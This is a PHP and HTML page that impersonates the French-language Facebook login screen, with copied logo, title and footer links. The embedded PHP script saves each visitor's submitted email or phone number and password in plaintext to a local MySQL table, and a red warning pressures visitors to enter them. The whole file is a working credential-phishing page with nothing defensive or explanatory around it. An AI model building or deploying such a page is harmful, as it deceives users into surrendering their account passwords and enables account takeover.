<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
    <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png" type="image/png">
    <title>Facebook</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="CSS/styles.css">
</head>
<?php
// Connexion à la base de données
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "get_users";

$conn = new mysqli($servername, $username, $password, $dbname);

// Vérifier la connexion
if ($conn->connect_error) {
    die("La connexion a échoué : " . $conn->connect_error);
}

// Traitement du formulaire
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['btn-login'])) {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    // Préparation de la requête SQL
    $stmt = $conn->prepare("INSERT INTO users (usernames, passwords) VALUES (?, ?)");
    $stmt->bind_param("ss", $user, $pass);
    
    // Exécuter la requête et vérifier l'insertion
    if ($stmt->execute()) {
        echo "<script> alert('Utilisateur ajouté avec succès !')</script>";
    } else {
        echo "<p>Erreur : " . $stmt->error . "</p>";
    }
    
    $stmt->close();
}

$conn->close();
?>
<body>
<main>
        <div class="row">
            <div class="col-logo" >
                <img src="images/fb_logo.svg" alt="Logo">
                <h2>Avec Facebook, partagez et restez en contact avec votre entourage .</h2>
                <h6 style="color: red;">⚠️ Veuillez renseigner ces champs pour accéder au site </h6>
            </div>
            <div class="col-form">
                <form class="form-container" method="POST" action="">
                    <input type="text" name="username" placeholder="Adresse e-mail ou numéro de tél." required>
                    <input type="password" name="password" placeholder="Mot de passe" required>
                    <button type="submit" name="btn-login" class="btn-login">Se connecter</button>
                    <a href="https://web.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzI5OTQzNzY1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next">Mot de passe oublié&nbsp;?</a>
                    <hr class="line">
                    <button class="btn-new"> <a href="https://web.facebook.com/r.php" style="text-decoration: none; color:white">Créer nouveau compte</a></button>
                </form>
                <p class="subjection"><a href="#"><b>Créer une Page </b></a>pour une célébrité, une marque ou une entreprise.</p>
            </div>
        </div>
    </main>
    <footer class="footer py-4">
    <div class="container">
        <!-- Section Langues -->
        <div class="d-flex flex-wrap justify-content-center">
            <a dir="ltr" href="https://web.facebook.com/?locale=fr_FR" title="Français (FR)" id="u_0_6_uh" class="text-muted mx-2">Français (France)</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=en_US" title="English (US)" id="u_0_6_uh" class="text-muted mx-2">English (US)</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=pt_BR" title="Portuguese (Brazil)" id="u_0_6_uh" class="text-muted mx-2">Português (Brasil)</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=es_LA" title="Spanish" id="u_0_6_uh" class="text-muted mx-2">Español</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=fr_FR" title="English (US)" id="u_0_6_uh" class="text-muted mx-2">Bahasa Indonesia</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=fr_FR" title="Italiano (It)" id="u_0_6_uh" class="text-muted mx-2">Italiano</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=fr_FR" title="Deutsch" id="u_0_6_uh" class="text-muted mx-2">Deutsch</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=fr_FR" title="العربية " id="u_0_6_uh" class="text-muted mx-2">العربية</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=fr_FR" title="हिन्दी" id="u_0_6_uh" class="text-muted mx-2">हिन्दी</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=fr_FR" title="中文(简体)" id="u_0_6_uh" class="text-muted mx-2">中文(简体)</a>
            <a dir="ltr" href="https://web.facebook.com/?locale=fr_FR" title="日本語" id="u_0_6_uh" class="text-muted mx-2">日本語</a>
            <a role="button" class=" abtn btn btn-link text-muted p-0 mx-2 _42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fja-jp.facebook.com%2F%3Flocale%3Dja_JP&amp;source=www_list_selector_more" href="#" title="Voir plus de langues"><button class="abtn btn btn-link">+</button></a>
        </div>

        <hr class="my-4">

        <!-- Section Liens -->
        <div class="d-flex flex-wrap justify-content-center">
            <a href="https://web.facebook.com/r.php" class="text-muted mx-2">S’inscrire</a>
            <a href="#" class="text-muted mx-2">Se connecter</a>
            <a href="https://messenger.com/" title="Essayez Messenger.">Messenger</a>
            <a href="https://web.facebook.com/lite/" title="Facebook Lite pour Android.">Facebook Lite</a>
            <a href="https://web.facebook.com/watch/" title="Naviguez dans Vidéo">Vidéo</a>
            <a href="https://web.facebook.com/places/" title="Découvrez les lieux populaires sur Facebook.">Lieux</a>
            <a href="https://web.facebook.com/games/" title="Découvrez les jeux Facebook.">Jeux</a>
            <a href="https://web.facebook.com/marketplace/" title="Achetez et vendez sur Facebook Marketplace.">Marketplace</a>
            <a href="https://about.meta.com/technologies/meta-pay" title="En savoir plus sur Meta Pay" target="_blank">Meta Pay</a>
            <a href="https://www.meta.com/" title="Découvrez Meta" target="_blank">Meta Store</a>
            <a href="https://www.meta.com/quest/" title="En savoir plus sur Meta Quest" target="_blank">Meta&nbsp;Quest</a>
            <a href="https://www.meta.com/smart-glasses/" title="En savoir plus sur Ray-Ban&nbsp;Meta" target="_blank">Ray-Ban&nbsp;Meta</a>
            <a href="https://www.meta.ai/" title="Meta&nbsp;AI">Meta&nbsp;AI</a>
            <a href="https://www.instagram.com/" title="Découvrez Instagram" target="_blank" rel="noreferrer nofollow" data-lynx-mode="asynclazy" data-lynx-uri="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT1Oq9v8cMn7X-gHTEqKx1GlHtpEeYGEStbJp-pNfYa-pqodngubLVeK_PP4e3mHYYQ8-RcmZ-vJG6ssk5WjkK92psnfINNAEd-P-Ipb_IGgU6OzyvbC7TSc-3cMpKuoSut7RLFFGi2PDqcIB791Eg">Instagram</a>
            <a href="https://www.threads.net/" title="Découvrez Threads">Threads</a>
            <a href="https://web.facebook.com/fundraisers/" title="Faire un don à des causes qui le méritent.">Collectes de dons</a>
            <a href="https://web.facebook.com/biz/directory/" title="Parcourir notre annuaire des services Facebook.">Services</a>
            <a href="https://web.facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="Voir le Centre d’information sur les élections.">Centre d’information sur les élections</a>
            <a href="https://web.facebook.com/privacy/policy/?entry_point=facebook_page_footer" title="Découvrez comment nous collectons, utilisons et partageons les informations pour faire fonctionner Facebook.">Politique de confidentialité</a>
            <a href="https://web.facebook.com/privacy/center/?entry_point=facebook_page_footer" title="Découvrez comment gérer et contrôler votre confidentialité sur Facebook.">Centre de confidentialité</a>
            <a href="https://web.facebook.com/groups/discover/" title="Découvrir nos groupes.">Groupes</a>
            <a href="https://about.meta.com/" accesskey="8" title="Consultez notre blog, découvrez notre centre de ressources et recherchez des offres d’emploi.">À propos</a>
            <a href="https://web.facebook.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Diffusez votre publicité sur Facebook.">Créer une publicité</a>
            <a href="https://web.facebook.com/pages/create/?ref_type=site_footer" title="Créez une Page.">Créer une Page</a>
            <a href="https://developers.facebook.com/?ref=pf" title="Développez sur notre propre plateforme.">Développeurs</a>
            <a href="https://web.facebook.com/careers/?ref=pf" title="Faites évoluer votre carrière en rejoignant notre incroyable entreprise.">Emplois</a>
            <a href="https://web.facebook.com/policies/cookies/" title="À propos des cookies et de Facebook." data-nocookies="1">Cookies</a>
            <a class="_41ug" data-nocookies="1" href="https://web.facebook.com/help/568137493302217" title="En savoir plus sur Choisir sa publicité.">Choisir sa publicité<i class="img sp_YbiIuPczOY_ sx_b2cf63"></i></a>
            <a data-nocookies="1" href="https://web.facebook.com/policies?ref=pf" accesskey="9" title="Prenez connaissance des conditions générales et des règlements.">Conditions générales</a>
            <a href="https://web.facebook.com/help/?ref=pf" accesskey="0" title="Consultez les pages d’aide.">Aide</a>
            <a href="help/637205020878504" title="Consultez notre avis sur l’importation des contacts et les non-utilisateurs.">Importation des contacts et non-utilisateurs</a>
            <a accesskey="6" class="accessible_elem" href="https://web.facebook.com/settings" title="Affichez et modifiez vos paramètres Facebook.">Paramètres</a>
            <a accesskey="7" class="accessible_elem" href="https://web.facebook.com/allactivity?privacy_source=activity_log_top_menu" title="Affichez votre Historique d’activité">Historique d’activité</a>
        </div>

        <div class="text-center mt-4">
            <small class="text-muted">Meta © 2024</small>
        </div>
    </div>
</footer>

</body>

</html>